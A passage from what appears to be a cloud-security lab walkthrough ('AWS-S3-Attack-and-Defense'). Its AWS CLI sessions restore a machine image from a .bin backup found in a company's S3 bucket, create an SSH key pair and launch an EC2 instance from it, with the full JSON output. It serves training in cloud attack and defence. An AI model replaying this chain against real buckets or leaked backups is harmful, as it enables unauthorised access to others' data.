...
```bash
:~/AWS-S3-Attack-and-Defense# aws ec2 create-restore-image-task --object-key ami-056a6742115906e8c.bin --bucket assets.bestcloudcompany.org --name rosana --region us-east-1
{
    "ImageId": "ami-008edc9d45878c631"
}
:~/AWS-S3-Attack-and-Defense# aws  ec2 create-key-pair --key-name mykey --query "KeyMaterial" --output text > ~/.ssh/bestkeys.pem
:~/AWS-S3-Attack-and-Defense# ls
ami-056a6742115906e8c.bin  index.html  media
:~/AWS-S3-Attack-and-Defense# cd ~/.ssh
:~/.ssh# ls
authorized_keys  bestkeys.pem  known_hosts
:~/.ssh# cd ~/AWS-S3-Attack-and-Defense
:~/AWS-S3-Attack-and-Defense# aws ec2 describe-subnets > subnestinfo
:~/AWS-S3-Attack-and-Defense# cat subnestinfo | grep SubnetId
...
```bash
:~/AWS-S3-Attack-and-Defense# aws ec2 run-instances --image-id ami-008edc9d45878c631 --instance-type t3a.micro --key-name mykey --subnet-id subnet-026329a4e5b98cb69 --security-group-id sg-03a0b9ee397718daa
{
    "Groups": [],
    "Instances": [
        {
            "AmiLaunchIndex": 0,
            "ImageId": "ami-008edc9d45878c631",
            "InstanceId": "i-0f2792dc218473f4a",
            "InstanceType": "t3a.micro",
            "KeyName": "mykey",
            "LaunchTime": "2025-05-24T17:46:15+00:00",
            "Monitoring": {
                "State": "disabled"
            },
            "Placement": {
            ...
            "PrivateDnsName": "ip-10-0-0-102.ec2.internal",
            ...
            "Architecture": "x86_64",
            "BlockDeviceMappings": [],
            "ClientToken": "d0862048-3b89-4d23-93fe-727181ef5224",
            "EbsOptimized": false,
            "EnaSupport": true,
            "Hypervisor": "xen",
            "NetworkInterfaces": [
                {
                    "Attachment": {
                        "AttachTime": "2025-05-24T17:46:15+00:00",
                        "AttachmentId": "eni-attach-0438adaeee768be07",
                    ...
                    "Ipv6Addresses": [],
                    "MacAddress": "12:bd:9d:69:37:d1",
                    "NetworkInterfaceId": "eni-095be024b6b3a2964",
    ...
    "OwnerId": "551334172628",
    "ReservationId": "r-07f9a9c779b5ff40d"
}
